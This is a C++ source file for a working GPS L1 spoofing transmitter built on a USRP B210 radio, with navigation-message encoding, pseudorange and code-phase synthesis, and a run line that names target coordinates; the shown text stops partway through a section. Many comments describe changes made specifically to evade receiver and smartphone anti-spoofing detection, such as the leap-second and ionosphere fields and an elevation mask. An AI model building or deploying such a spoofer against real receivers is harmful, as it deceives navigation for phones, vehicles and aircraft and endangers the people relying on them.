// =============================================================================
// ultimate_spoofer.cpp  — Single-Band L1 GPS Spoofing Engine (v6 — All Fixed)
// =============================================================================
//   RX Worker (ch0, 1575.42 MHz)
//       │  captures 1ms blocks at L1
//       │  measures AGC power (LISTEN phase only — frozen after)
//       ▼
//   [RxRing: SpscRingBuffer<RxBlock, 256>]
//       │
//       ▼
//   DSP Worker
//       │  gates AGC update to ms_count < LISTEN_MS
//       │  computes current_pos drift toward final_target (OWN phase)
//       │  calls SatCalc::calculate_target per SV with current_pos
//       │  synthesizes L1 C/A with 50-bps LNAV phase flip
//       │  sums 4 SVs, applies amplitude_scale
//       ▼
//   [TxRing: SpscRingBuffer<TxBlock, 256>]
//       │
//       ▼
//   TX Worker (single channel 0)
//       │  ch0 TX: L1  1575.42 MHz
//       └─ uhd::tx_streamer({0}), wire="sc8", 4.096 Msps
//
// B210 Hardware Parameters (AD9361):
//   master_clock_rate = 16.384 MHz  (integer ratio: 16.384 / 4.096 = 4 exactly)
//   tx_rate = rx_rate = 4.096 Msps
//   SAMPLES_PER_MS    = 4096        (one complete C/A code epoch)
//   Wire format       = sc8 (8-bit IQ)  → 4.096M × 2 = 8.2 MB/s  ← well under USB budget
//
// Build:
//   g++ -std=c++17 -O3 -march=native -o ultimate_spoofer \
//       ultimate_spoofer.cpp TrajectoryModule.cpp \
//       $(pkg-config --cflags --libs uhd) -lpthread -lm
//
// Run:
//   ./ultimate_spoofer
//   ./ultimate_spoofer --lat 17.604012 --lon 78.126885 --l1-gain 15
// =============================================================================

#include "TrajectoryModule.h"

#include <uhd/usrp/multi_usrp.hpp>
#include <uhd/utils/thread.hpp>
#include <uhd/types/tune_request.hpp>
#include <uhd/stream.hpp>

#include <algorithm>
#include <array>
#include <atomic>
#include <chrono>
#include <complex>
#include <map>
#include <csignal>
#include <cstdint>
#include <cstring>
#include <iomanip>
#include <iostream>
#include <stdexcept>
#include <string>
#include <thread>
#include <vector>
#include <cmath>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include <cstdio>

// =============================================================================
// DEBUG MODE LOGGING (NDJSON)
// =============================================================================
// #region agent log
static inline void dbg_ndjson_append(
    const char* runId,
    const char* hypothesisId,
    const char* location,
    const char* message,
    const std::string& data_json_object)
{
    static constexpr const char* kLogPath = "ultimate_spoofer_debug.log";
    const auto now_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
        std::chrono::system_clock::now()).time_since_epoch().count();

    FILE* fp = std::fopen(kLogPath, "ab");
    if (!fp) {
        const int e = errno;
        std::cerr << "[DEBUG-758b4f] cannot open log path: " << kLogPath
                  << " errno=" << e << " (" << std::strerror(e) << ")\n";
        return;
    }

    auto esc = [](std::string s) {
        for (char& c : s) {
            if (c == '\"') c = '\'';
            if (c == '\n' || c == '\r' || c == '\t') c = ' ';
        }
        return s;
    };

    const std::string loc = esc(location ? location : "");
    const std::string msg = esc(message ? message : "");
    const std::string rid = esc(runId ? runId : "");
    const std::string hid = esc(hypothesisId ? hypothesisId : "");

    std::ostringstream line;
    line << "{"
         << "\"sessionId\":\"758b4f\","
         << "\"id\":\"log_" << now_ms << "_" << reinterpret_cast<uintptr_t>(fp) << "\","
         << "\"timestamp\":" << now_ms << ","
         << "\"location\":\"" << loc << "\","
         << "\"message\":\"" << msg << "\","
         << "\"runId\":\"" << rid << "\","
         << "\"hypothesisId\":\"" << hid << "\","
         << "\"data\":" << (data_json_object.empty() ? "{}" : data_json_object)
         << "}\n";

    const std::string s = line.str();
    (void)std::fwrite(s.data(), 1, s.size(), fp);
    (void)std::fflush(fp);
    (void)std::fclose(fp);
}

static inline void dbg_log_marker_stdout() {
    std::cerr << "[DEBUG-758b4f] instrumentation active\n";
}
// #endregion agent log

// =============================================================================
// SECTION 1: HARDWARE & DSP CONSTANTS
// =============================================================================

// ── B210 single-channel L1 parameters ────────────────────────────────────────
// MCR = 16.384 MHz gives an exact integer decimation ratio of 4 to 4.096 Msps.
// This is the cleanest possible rate for L1 C/A: exactly 4096 samples/ms,
// one sample per nanosecond of GPS chip at 1.023 Mcps.
static constexpr double MASTER_CLK_HZ   = 16'384'000.0;   // 16.384 MHz
static constexpr double SAMPLE_RATE_HZ  =  4'096'000.0;   // 4.096 Msps
static constexpr double L1_FREQ_HZ      = 1'575'420'000.0; // GPS L1 C/A
static constexpr double L1_GAIN_DB      = 50.0;            // TX gain (B210 max ~89.75)
static constexpr double RX_GAIN_DB      = 35.0;            // RX gain

// ── DSP block dimensions ──────────────────────────────────────────────────────
// 4096 samples = 1ms at 4.096 Msps = exactly one C/A code epoch.
static constexpr size_t SAMPLES_PER_MS  = 4096;

// TX is accumulated in 10ms batches per send() call.
// 10ms > USB scheduler jitter (~2ms) → prevents underflows under CPU load.
static constexpr size_t TX_BLOCK_MS     = 10;
static constexpr size_t TX_SPB          = SAMPLES_PER_MS * TX_BLOCK_MS; // 40960

// ── Ring buffer capacity ──────────────────────────────────────────────────────
// Must be a power of 2. 256 × 1ms = 256ms pipeline headroom.
// Memory: 256 × 4096 × 8 bytes (complex<float>) ≈ 8 MB — trivial.
static constexpr size_t RING_CAPACITY   = 256;

// ── Signal composition ────────────────────────────────────────────────────────
static constexpr int    N_SV            = 8;
// MASTER_SCALE prevents superposition of N_SV satellites from clipping DAC.
// 0.8 / 8 = 0.1 per SV; sum at coherent peak = 0.8 < 1.0 — no clipping.
static constexpr float  MASTER_SCALE    = 0.8f / static_cast<float>(N_SV);
static constexpr int    CODE_CHIPS_L1   = 1023;
static constexpr double L1_CHIP_RATE    = 1'023'000.0; // 1.023 Mcps

// ── Navigation data (50 bps LNAV) ────────────────────────────────────────────
// 20ms per nav bit = 20 C/A code epochs per bit boundary.
static constexpr int    NAV_BPS           = 50;
static constexpr int    MS_PER_BIT        = 20;
static constexpr int    BITS_PER_SUBFRAME = 300; // 6s subframe × 50 bps

// ── TX-only amplitude ────────────────────────────────────────────────────────
// Fixed amplitude for RF-isolated lab testing.
// No real-sky AGC reference needed.  0.8 / N_SV keeps the IQ sum below
// DAC full-scale even at coherent peak of all N_SV satellites.
// Adjust TX gain on the B210 front-panel (--l1-gain) for target C/N0.
static constexpr float  TX_AMPLITUDE_SCALE = MASTER_SCALE;   // 0.8 / N_SV
// 1 m/s expressed as degrees per millisecond:
//   1 m/s / 111320 m/deg / 1000 ms/s ≈ 8.975e-9 deg/ms
// Used for both latitude and longitude components (longitude corrected by
// cos(lat) inside the drift loop).
static constexpr double DRIFT_DEG_PER_MS = 8.975e-9;

// =============================================================================
// SECTION 2: LOCK-FREE SPSC RING BUFFER
// =============================================================================
//
// Single-Producer / Single-Consumer ring buffer.
// Zero mutex, zero condvar — synchronised with atomic acquire/release pairs.
// Capacity must be a power of 2 (enables bitmask modulo in the hot path).

template<typename T, size_t Capacity>
class SpscRingBuffer {
    static_assert(Capacity >= 2 && (Capacity & (Capacity - 1)) == 0,
                  "Capacity must be a power of 2 >= 2");
    static constexpr size_t MASK = Capacity - 1;

    T storage_[Capacity];

    // Producer-owned: written only by producer, read-acquired by consumer.
    alignas(64) std::atomic<size_t> write_idx_{0};
    // Consumer-owned: written only by consumer, read-acquired by producer.
    // Separate cache line from write_idx_ to prevent false sharing.
    alignas(64) std::atomic<size_t> read_idx_{0};

public:
    // Producer side — returns false if full (non-blocking).
    bool try_push(T&& item) noexcept {
        const size_t w    = write_idx_.load(std::memory_order_relaxed);
        const size_t next = (w + 1) & MASK;
        if (next == read_idx_.load(std::memory_order_acquire))
            return false;
        storage_[w] = std::move(item);
        write_idx_.store(next, std::memory_order_release);
        return true;
    }

    bool try_push(const T& item) noexcept {
        T copy(item);
        return try_push(std::move(copy));
    }

    // Consumer side — returns false if empty (non-blocking).
    bool try_pop(T& item) noexcept {
        const size_t r = read_idx_.load(std::memory_order_relaxed);
        if (r == write_idx_.load(std::memory_order_acquire))
            return false;
        item = std::move(storage_[r]);
        read_idx_.store((r + 1) & MASK, std::memory_order_release);
        return true;
    }

    size_t approx_size() const noexcept {
        const size_t w = write_idx_.load(std::memory_order_relaxed);
        const size_t r = read_idx_.load(std::memory_order_relaxed);
        return (w - r) & MASK;
    }

    bool empty() const noexcept {
        return write_idx_.load(std::memory_order_relaxed) ==
               read_idx_.load(std::memory_order_relaxed);
    }
};

// =============================================================================
// SECTION 3: BLOCK TYPES
// =============================================================================

// TX-ONLY mode: no RX path needed.
// The spoofer generates and transmits fake GPS signals directly.
struct TxBlock {
    std::array<std::complex<float>, SAMPLES_PER_MS> ch0;  // L1 only
};
using TxRing = SpscRingBuffer<TxBlock, RING_CAPACITY>;

// =============================================================================
// SECTION 4a: KLOBUCHAR IONOSPHERIC MODEL PARAMETERS
// =============================================================================
//
// IS-GPS-200H §20.3.3.5.2.5 and ICD Table 20-X:
// Subframe 4 Page 18 broadcasts the 8-coefficient Klobuchar model used by
// single-frequency receivers to correct ionospheric delay on L1.
//
// FIX (Flaw 4): Without these coefficients receivers see an atmospheric error
// that does not match any standard model, and anti-spoofing firmware flags the
// discrepancy as "Unreliable" and rejects the fix.  Broadcasting valid
// coefficients — parsed from today's RINEX header — closes this detection gap.
//
// Scale factors per IS-GPS-200H Table 20-X:
//   alpha_0..3: 2^-30, 2^-27, 2^-24, 2^-24 (s, s/sc, s/sc², s/sc³)
//   beta_0..3:  2^11,  2^14,  2^16,  2^16  (s, s/sc, s/sc², s/sc³)
struct KlobucharParams {
    double alpha[4] = {4.6566e-9, 1.4901e-8, -5.9605e-8, -5.9605e-8};
    double beta[4]  = {90112.0,   98304.0,   -65536.0,   -458752.0};

    // ── UTC parameters for SF4 Page 18, Words 6-10 ───────────────────────────
    // IS-GPS-200H Table 20-X: these allow receivers to convert GPS time to UTC.
    // Smartphones (Android/iOS) cross-check GPS time against cell-network time
    // using Delta_t_LS (current leap seconds).  If the field is zero the
    // baseband computes a GPS-to-UTC offset of 0 s instead of the correct 18 s,
    // sees an 18-second discrepancy versus the cell clock, and flags the signal
    // as anomalous — refusing to show a position fix.
    //
    // Safe defaults (correct for 2017-present):
    //   dtls   = 18  ← GPS is currently 18 s ahead of UTC (leap second count)
    //   dtlsf  = 18  ← no scheduled leap second, future = current
    //   wnlsf  = 201 ← 1929 % 256 = 201  (week of the 2016-12-31 leap second)
    //   dn     = 7   ← Saturday (day 7 of that week)
    double A0    = 0.0;   // UTC time-scale offset  [s],   scale 2^-30
    double A1    = 0.0;   // UTC clock drift rate   [s/s], scale 2^-50
    int    tot   = 0;     // UTC reference time      [s], packed as tot/4096 in the word
    int    wnt   = 0;     // UTC reference GPS week % 256
    int    dtls  = 18;    // Current leap seconds    [s]  — THE CRITICAL FIELD
    int    wnlsf = 201;   // Leap-second week % 256 (1929%256, last event Dec 2016)
    int    dn    = 7;     // Day of leap second [1=Sun … 7=Sat]
    int    dtlsf = 18;    // Future leap seconds [s] (same as dtls: no event pending)

    bool   valid = false;  // set true when parsed from RINEX header
};

// ── IonoModel adapter for TrajectoryModule ───────────────────────────────────
// TrajectoryModule uses IonoModel (defined in TrajectoryModule.h) so it stays
// independent of the spoofer's KlobucharParams.  Convert here.
static IonoModel make_iono_model(const KlobucharParams& kp) {
    IonoModel m;
    m.alpha[0] = kp.alpha[0]; m.alpha[1] = kp.alpha[1];
    m.alpha[2] = kp.alpha[2]; m.alpha[3] = kp.alpha[3];
    m.beta[0]  = kp.beta[0];  m.beta[1]  = kp.beta[1];
    m.beta[2]  = kp.beta[2];  m.beta[3]  = kp.beta[3];
    m.valid    = kp.valid;
    return m;
}

// =============================================================================
// SECTION 4-8: PORTED FROM gpssim.c — PROVEN NAV MESSAGE + IQ SYNTHESIS
// =============================================================================
#include "gpssim_nav.h"

// Scale factors from gpssim.c
#define POW2_M5  0.03125
#define POW2_M19 1.907348632812500e-6
#define POW2_M29 1.862645149230957e-9
#define POW2_M31 4.656612873077393e-10
#define POW2_M33 1.164153218269348e-10
#define POW2_M43 1.136868377216160e-13
#define POW2_M55 2.775557561562891e-17
#define POW2_M50 8.881784197001252e-016
#define POW2_M30 9.313225746154785e-010
#define POW2_M27 7.450580596923828e-009
#define POW2_M24 5.960464477539063e-008

// ── eph2sbf: bit-exact port from gpssim.c eph2sbf() ──
void GpsSimChannel::eph2sbf(const Ephemeris& eph, const KlobucharParams& iono) {
    unsigned long wn, toe, toc, iode, iodc, deltan;
    unsigned long cuc, cus, cic, cis, crc, crs;
    long ecc, sqrta, m0, omg0, inc0, aop, omgdot, idot;
    long af0, af1, af2, tgd;
    unsigned long svhlth, codeL2, ura;

    wn = 0UL; // Filled at runtime by generateNavMsg
    toe = (unsigned long)(eph.toe / 16.0);
    toc = (unsigned long)(eph.toc / 16.0);
    iode = (unsigned long)(eph.IODE);
    iodc = (unsigned long)(eph.IODC);
    deltan = (long)(eph.delta_n / POW2_M43 / GPS_PI);
    cuc = (long)(eph.Cuc / POW2_M29);
    cus = (long)(eph.Cus / POW2_M29);
    cic = (long)(eph.Cic / POW2_M29);
    cis = (long)(eph.Cis / POW2_M29);
    crc = (long)(eph.Crc / POW2_M5);
    crs = (long)(eph.Crs / POW2_M5);
    ecc = (unsigned long)(eph.e / POW2_M33);
    sqrta = (unsigned long)(eph.sqrt_A / POW2_M19);
    m0 = (long)(eph.M0 / POW2_M31 / GPS_PI);
    omg0 = (long)(eph.omega0 / POW2_M31 / GPS_PI);
    inc0 = (long)(eph.i0 / POW2_M31 / GPS_PI);
    aop = (long)(eph.omega / POW2_M31 / GPS_PI);
    omgdot = (long)(eph.omega_dot / POW2_M43 / GPS_PI);
    idot = (long)(eph.idot / POW2_M43 / GPS_PI);
    af0 = (long)(eph.af0 / POW2_M31);
    af1 = (long)(eph.af1 / POW2_M43);
    af2 = (long)(eph.af2 / POW2_M55);
    tgd = (long)(eph.Tgd / POW2_M31);
    svhlth = 0UL; // healthy
    codeL2 = 0UL;
    ura = 0UL;

    unsigned long wna = (unsigned long)(eph.week % 256);
    unsigned long toa = (unsigned long)(eph.toe / 4096.0);

    // Iono params
    long alpha0 = (long)round(iono.alpha[0]/POW2_M30);
    long alpha1 = (long)round(iono.alpha[1]/POW2_M27);
    long alpha2 = (long)round(iono.alpha[2]/POW2_M24);
    long alpha3 = (long)round(iono.alpha[3]/POW2_M24);
    long beta0 = (long)round(iono.beta[0]/2048.0);
    long beta1 = (long)round(iono.beta[1]/16384.0);
    long beta2 = (long)round(iono.beta[2]/65536.0);
    long beta3 = (long)round(iono.beta[3]/65536.0);
    long A0 = (long)round(iono.A0/POW2_M30);
    long A1 = (long)round(iono.A1/POW2_M50);
    long dtls = (long)(iono.dtls);
    unsigned long tot_w = (unsigned long)(iono.tot/4096);
    unsigned long wnt = (unsigned long)(iono.wnt % 256);

    unsigned long dataId = 0x1UL;
    unsigned long sbf4_page18_svId = 56UL;
    unsigned long sbf5_page25_svId = 51UL;

    // Subframe 1
    sbf[0][0] = 0x8B0000UL<<6;
    sbf[0][1] = 0x1UL<<8;
// CORRECTED: Include WN in bits 20-29
sbf[0][2] = ((wn & 0x3FFUL) << 20) | 
            ((codeL2 & 0x3UL) << 18) | 
            ((ura & 0xFUL) << 14) | 
            ((svhlth & 0x3FUL) << 8) | 
            (((iodc >> 8) & 0x3UL) << 6);
    sbf[0][3] = 0UL;
    sbf[0][4] = 0UL;
    sbf[0][5] = 0UL;
    sbf[0][6] = (tgd&0xFFUL)<<6;
    sbf[0][7] = ((iodc&0xFFUL)<<22) | ((toc&0xFFFFUL)<<6);
    sbf[0][8] = ((af2&0xFFUL)<<22) | ((af1&0xFFFFUL)<<6);
    sbf[0][9] = (af0&0x3FFFFFUL)<<8;

    // Subframe 2
    sbf[1][0] = 0x8B0000UL<<6;
    sbf[1][1] = 0x2UL<<8;
    sbf[1][2] = ((iode&0xFFUL)<<22) | ((crs&0xFFFFUL)<<6);
    sbf[1][3] = ((deltan&0xFFFFUL)<<14) | (((m0>>24)&0xFFUL)<<6);
    sbf[1][4] = (m0&0xFFFFFFUL)<<6;
    sbf[1][5] = ((cuc&0xFFFFUL)<<14) | (((ecc>>24)&0xFFUL)<<6);
    sbf[1][6] = (ecc&0xFFFFFFUL)<<6;
    sbf[1][7] = ((cus&0xFFFFUL)<<14) | (((sqrta>>24)&0xFFUL)<<6);
    sbf[1][8] = (sqrta&0xFFFFFFUL)<<6;
    sbf[1][9] = (toe&0xFFFFUL)<<14;

    // Subframe 3
    sbf[2][0] = 0x8B0000UL<<6;
    sbf[2][1] = 0x3UL<<8;
    sbf[2][2] = ((cic&0xFFFFUL)<<14) | (((omg0>>24)&0xFFUL)<<6);
    sbf[2][3] = (omg0&0xFFFFFFUL)<<6;
    sbf[2][4] = ((cis&0xFFFFUL)<<14) | (((inc0>>24)&0xFFUL)<<6);
    sbf[2][5] = (inc0&0xFFFFFFUL)<<6;
    sbf[2][6] = ((crc&0xFFFFUL)<<14) | (((aop>>24)&0xFFUL)<<6);
    sbf[2][7] = (aop&0xFFFFFFUL)<<6;
    sbf[2][8] = (omgdot&0xFFFFFFUL)<<6;
    sbf[2][9] = ((iode&0xFFUL)<<22) | ((idot&0x3FFFUL)<<8);

    // Subframe 4, page 18 (iono + UTC)
    sbf[3][0] = 0x8B0000UL<<6;
    sbf[3][1] = 0x4UL<<8;
    sbf[3][2] = (dataId<<28) | (sbf4_page18_svId<<22) | ((alpha0&0xFFUL)<<14) | ((alpha1&0xFFUL)<<6);
    sbf[3][3] = ((alpha2&0xFFUL)<<22) | ((alpha3&0xFFUL)<<14) | ((beta0&0xFFUL)<<6);
    sbf[3][4] = ((beta1&0xFFUL)<<22) | ((beta2&0xFFUL)<<14) | ((beta3&0xFFUL)<<6);
    sbf[3][5] = (A1&0xFFFFFFUL)<<6;
    sbf[3][6] = ((A0>>8)&0xFFFFFFUL)<<6;
    sbf[3][7] = ((A0&0xFFUL)<<22) | ((tot_w&0xFFUL)<<14) | ((wnt&0xFFUL)<<6);
    const unsigned long wnlsf = static_cast<unsigned long>(iono.wnlsf % 256);
    const unsigned long dn    = static_cast<unsigned long>(iono.dn);
    const unsigned long dtlsf = static_cast<unsigned long>(iono.dtlsf);
    sbf[3][8] = ((static_cast<unsigned long>(dtls)&0xFFUL)<<22)
              | ((wnlsf&0xFFUL)<<14) | ((dn&0xFFUL)<<6);
    sbf[3][9] = (dtlsf&0xFFUL)<<22;

    // Subframe 5, page 25
    sbf[4][0] = 0x8B0000UL<<6;
    sbf[4][1] = 0x5UL<<8;
    sbf[4][2] = (dataId<<28) | (sbf5_page25_svId<<22) | ((toa&0xFFUL)<<14) | ((wna&0xFFUL)<<6);
    for (int i = 3; i < 10; i++) sbf[4][i] = 0UL;
}

// ── SvState wraps GpsSimChannel for the TX pipeline ──
struct SvState {
    Ephemeris      eph;
    GpsSimChannel  chan;
    int            sv_id;

    explicit SvState(const Ephemeris& e, const KlobucharParams& iono = KlobucharParams{})
        : eph(e), sv_id(e.sv_id)
    {
        chan.prn = e.sv_id;
        chan.generateCAcode();
        chan.eph2sbf(e, iono);
        chan.generateNavMsg(e.week, 0.0, true); // will be re-called with real time
        std::cout << "  SV" << std::setw(2) << e.sv_id
                  << ": gpssim channel init (PRN=" << e.sv_id << ")\n";
    }
};

// ── computeRange: ported from gpssim.c ──────────────────────────────────────
// Computes pseudorange, range rate, azimuth/elevation for a satellite.
// This is CRITICAL for computeCodePhase which synchronizes nav data timing.
struct GpsRange {
    double range;       // pseudorange [m]
    double rate;        // pseudorange rate [m/s]
    double d;           // geometric distance [m]
    double azel[2];     // azimuth, elevation [rad]
    double iono_delay;
    double sec;         // GPS TOW when computed
    int    week;
};

static void gps_satpos(const Ephemeris& eph, double tow_sec, int week,
                       double pos[3], double vel[3], double clk[2])
{
    double tk = tow_sec - eph.toe;
    if (tk > 302400.0) tk -= 604800.0;
    else if (tk < -302400.0) tk += 604800.0;

    double A = eph.sqrt_A * eph.sqrt_A;
    double n0 = sqrt(3.986005e14 / (A * A * A));
    double n = n0 + eph.delta_n;
    double mk = eph.M0 + n * tk;
    double ek = mk, ekold = ek + 1.0;
    double OneMinusecosE = 0;
    while (fabs(ek - ekold) > 1.0e-14) {
        ekold = ek;
        OneMinusecosE = 1.0 - eph.e * cos(ekold);
        ek = ek + (mk - ekold + eph.e * sin(ekold)) / OneMinusecosE;
    }
    double sek = sin(ek), cek = cos(ek);
    double ekdot = n / OneMinusecosE;
    double sq1e2 = sqrt(1.0 - eph.e * eph.e);

    double relativistic = -4.442807633e-10 * eph.e * eph.sqrt_A * sek;

    double pk = atan2(sq1e2 * sek, cek - eph.e) + eph.omega;
    double pkdot = sq1e2 * ekdot / OneMinusecosE;
    double s2pk = sin(2.0 * pk), c2pk = cos(2.0 * pk);

    double uk = pk + eph.Cus * s2pk + eph.Cuc * c2pk;
    double suk = sin(uk), cuk = cos(uk);
    double ukdot = pkdot * (1.0 + 2.0 * (eph.Cus * c2pk - eph.Cuc * s2pk));

    double rk = A * OneMinusecosE + eph.Crc * c2pk + eph.Crs * s2pk;
    double rkdot = A * eph.e * sek * ekdot + 2.0 * pkdot * (eph.Crs * c2pk - eph.Crc * s2pk);

    double ik = eph.i0 + eph.idot * tk + eph.Cic * c2pk + eph.Cis * s2pk;
    double sik = sin(ik), cik = cos(ik);
    double ikdot = eph.idot + 2.0 * pkdot * (eph.Cis * c2pk - eph.Cic * s2pk);

    double xpk = rk * cuk, ypk = rk * suk;
    double xpkdot = rkdot * cuk - ypk * ukdot;
    double ypkdot = rkdot * suk + xpk * ukdot;

    double omgkdot = eph.omega_dot - 7.2921151467e-5;
    double ok = eph.omega0 + tk * omgkdot - 7.2921151467e-5 * eph.toe;
    double sok = sin(ok), cok = cos(ok);

    pos[0] = xpk * cok - ypk * cik * sok;
    pos[1] = xpk * sok + ypk * cik * cok;
    pos[2] = ypk * sik;

    double tmp = ypkdot * cik - ypk * sik * ikdot;
    vel[0] = -omgkdot * pos[1] + xpkdot * cok - tmp * sok;
    vel[1] =  omgkdot * pos[0] + xpkdot * sok + tmp * cok;
    vel[2] = ypk * cik * ikdot + ypkdot * sik;

    double tk2 = tow_sec - eph.toc;
    if (tk2 > 302400.0) tk2 -= 604800.0;
    else if (tk2 < -302400.0) tk2 += 604800.0;
    clk[0] = eph.af0 + tk2 * (eph.af1 + tk2 * eph.af2) + relativistic - eph.Tgd;
    clk[1] = eph.af1 + 2.0 * tk2 * eph.af2;
}

static void gps_computeRange(GpsRange* rho, const Ephemeris& eph, double tow, int week,
                              const double xyz[3], const IonoModel* iono = nullptr)
{
    double pos[3], vel[3], clk[2], los[3];

    // Iterative light-time solve (same physics as gpssim computeRange + TrajectoryModule)
    double tau = 0.070;
    for (int iter = 0; iter < 10; ++iter) {
        const double t_tx = tow - tau;
        gps_satpos(eph, t_tx, week, pos, vel, clk);
        los[0] = pos[0] - xyz[0]; los[1] = pos[1] - xyz[1]; los[2] = pos[2] - xyz[2];
        const double tau_new = std::sqrt(los[0]*los[0] + los[1]*los[1] + los[2]*los[2])
                             / GPS_SPEED_OF_LIGHT;
        if (std::fabs(tau_new - tau) < 1e-12) { tau = tau_new; break; }
        tau = tau_new;
    }
    gps_satpos(eph, tow - tau, week, pos, vel, clk);

    pos[0] -= vel[0] * tau; pos[1] -= vel[1] * tau; pos[2] -= vel[2] * tau;

    // Earth rotation correction (gpssim.c computeRange)
    double xrot = pos[0] + pos[1] * 7.2921151467e-5 * tau;
    double yrot = pos[1] - pos[0] * 7.2921151467e-5 * tau;
    pos[0] = xrot; pos[1] = yrot;

    los[0] = pos[0] - xyz[0]; los[1] = pos[1] - xyz[1]; los[2] = pos[2] - xyz[2];
    double range = sqrt(los[0]*los[0] + los[1]*los[1] + los[2]*los[2]);
    rho->d = range;
    rho->range = range - GPS_SPEED_OF_LIGHT * clk[0];

    double rate = (vel[0]*los[0] + vel[1]*los[1] + vel[2]*los[2]) / range;
    rho->rate = rate;
    rho->sec = tow;
    rho->week = week;

    // Ionospheric delay (gpssim.c computeRange lines 1317-1319)
    ECEF user_ecef{xyz[0], xyz[1], xyz[2]};
    ECEF sat_ecef{pos[0], pos[1], pos[2]};
    double el_deg = 0.0, az_deg = 0.0;
    CoordinateMath::elevation_azimuth(user_ecef, sat_ecef, el_deg, az_deg);
    rho->azel[0] = az_deg * GpsConst::PI / 180.0;
    rho->azel[1] = el_deg * GpsConst::PI / 180.0;
    const WGS84 user_lla = CoordinateMath::ecef_to_lla(user_ecef);
    rho->iono_delay = CoordinateMath::klobuchar_delay_m(
        (iono != nullptr) ? *iono : IonoModel{},
        tow, el_deg, az_deg, user_lla.lat_deg, user_lla.lon_deg);
    rho->range += rho->iono_delay;
}

// ── computeCodePhase: ported from gpssim.c ──────────────────────────────────
// THE CRITICAL FUNCTION that synchronizes each satellite's code phase and
// nav data bit position with its pseudorange. Without this, all SVs start
// from bit 0 simultaneously → receiver rejects the solution.
static double gps_sub_time(double t1, double t0)
{
    double dt = t1 - t0;
    if (dt > 302400.0) dt -= 604800.0;
    else if (dt < -302400.0) dt += 604800.0;
    return dt;
}

static double ephemeris_age_sec(double gps_tow, double toe)
{
    return std::fabs(gps_sub_time(gps_tow, toe));
}

// Quick scan: newest toe in the RINEX file (for --rinex-time).
static double scan_rinex_freshest_toe(const std::string& rinex_path)
{
    std::ifstream file(rinex_path);
    if (!file.is_open()) return -1.0;
    std::string line;
    double freshest = -1.0;

    // Skip header
    while (std::getline(file, line)) {
        if (line.find("END OF HEADER") != std::string::npos) break;
    }

    while (std::getline(file, line)) {
        std::string orbit[7];
        for (int oi = 0; oi < 7; ++oi)
            if (!std::getline(file, orbit[oi])) orbit[oi] = " ";
        
        if (line.size() < 10) continue;
        
        // Parse SV ID from cols 0-1
        char buf[4] = { line.size() > 0 ? line[0] : ' ',
                        line.size() > 1 ? line[1] : ' ', '\0' };
        char* end = nullptr;
        const long sv = std::strtol(buf, &end, 10);
        if (sv < 1 || sv > 32) continue;
        
        // ✅ FIX: toe is in orbit line 3 (index 2), column 3 (RINEX 2.11 format)
        const std::string &o3 = orbit[2];  // toe Cic omega0 Cis
        if (o3.size() < 22) continue;
        
        auto parse_field = [](const std::string &s, int col) -> double {
            if (col >= static_cast<int>(s.size())) return 0.0;
            int start = col;
            if (col > 0 && (s[col-1] == '-' || s[col-1] == '+')) start = col - 1;
            std::string raw = s.substr(static_cast<size_t>(start),
                std::min(19, static_cast<int>(s.size()) - start));
            while (!raw.empty() && (raw.back() == '-' || raw.back() == '+')) raw.pop_back();
            for (char &c : raw) if (c == 'D' || c == 'd') c = 'e';
            try { return std::stod(raw); } catch (...) { return 0.0; }
        };
        
        const double toe = parse_field(o3, 3);  // ✅ CORRECT COLUMN
        if (toe > freshest) freshest = toe;
    }
    return freshest;
}

static void gps_computeCodePhase(GpsSimChannel* chan, const GpsRange& rho1,
                                  const GpsRange& rho0, double dt)
{
    // Pseudorange rate
    double rhorate = (rho1.range - rho0.range) / dt;

    // Carrier and code frequency (from gpssim.c)
    chan->f_carr = -rhorate / 0.190293672798365; // LAMBDA_L1
    chan->f_code = GPS_CODE_FREQ + chan->f_carr * (1.0 / 1540.0); // CARR_TO_CODE

    // gpssim.c: ms = ((subGpsTime(rho0.g, g0) + 6.0) - rho0.range/c) * 1000
    const double rel_sec = gps_sub_time(rho0.sec, chan->g0_sec);
    double ms = ((rel_sec + 6.0) - rho0.range / GPS_SPEED_OF_LIGHT) * 1000.0;

    int ims = (int)ms;
    chan->code_phase = (ms - (double)ims) * GPS_CA_SEQ_LEN;

    chan->iword = ims / 600;      // 1 word = 30 bits = 600 ms
    ims -= chan->iword * 600;

    chan->ibit = ims / 20;        // 1 bit = 20 codes = 20 ms
    ims -= chan->ibit * 20;

    chan->icode = ims;            // 1 code = 1 ms

    // Bounds check to prevent array overflow
    if (chan->iword < 0) chan->iword = 0;
    if (chan->iword >= GPS_N_DWRD) chan->iword = GPS_N_DWRD - 1;
    if (chan->ibit < 0) chan->ibit = 0;
    if (chan->ibit >= 30) chan->ibit = 29;
    if (chan->code_phase < 0) chan->code_phase = 0;
    if (chan->code_phase >= GPS_CA_SEQ_LEN) chan->code_phase = GPS_CA_SEQ_LEN - 1;

    chan->codeCA = chan->ca[(int)chan->code_phase] * 2 - 1;
    chan->dataBit = (int)((chan->dwrd[chan->iword] >> (29 - chan->ibit)) & 0x1UL) * 2 - 1;

    // Save state for next call (gpssim.c sets chan->rho0 = rho1)
    chan->rho0_range   = rho1.range;
    chan->rho0_gps_sec = rho1.sec;
}

// Initialize code phase / nav bit counters from pseudorange (gpssim allocateChannel path).
static void gps_init_channel_pseudorange(GpsSimChannel& chan,
                                         const Ephemeris& eph,
                                         double gps_tow,
                                         const double user_xyz[3],
                                         const IonoModel& iono)
{
    chan.generateNavMsg(eph.week, gps_tow, true);
    GpsRange rho0, rho1;
    gps_computeRange(&rho0, eph, gps_tow, eph.week, user_xyz, &iono);
    gps_computeRange(&rho1, eph, gps_tow + 0.1, eph.week, user_xyz, &iono);
    gps_computeCodePhase(&chan, rho1, rho0, 0.1);
}


// =============================================================================
// SECTION 9: LIVE RINEX CONSTELLATION
// =============================================================================

// ── Real elevation-mask visibility check ─────────────────────────────────────
// FIX (Flaw 2): The old stub returned `true` for every SV, broadcasting all
// 31+ satellites simultaneously.  Broadcasting more than ~12 SVs is physically
// impossible from a single point and is a textbook spoofing signature that
// modern GNSS firmware detects and rejects.
//
// We now use SatCalc::calculate_target() — the same orbital engine used by the
// DSP worker — to compute the true elevation angle for each SV at the observer
// position and GPS TOW supplied by the caller.  Only SVs above EL_MASK_DEG are
// retained, producing a realistic constellation of 6–10 satellites.
//
// The gps_tow parameter is threaded through from main() so the visibility check
// uses the same time reference as the rest of the engine.
static constexpr double EL_MASK_DEG = 10.0;  // matches IS-GPS-200H nominal mask

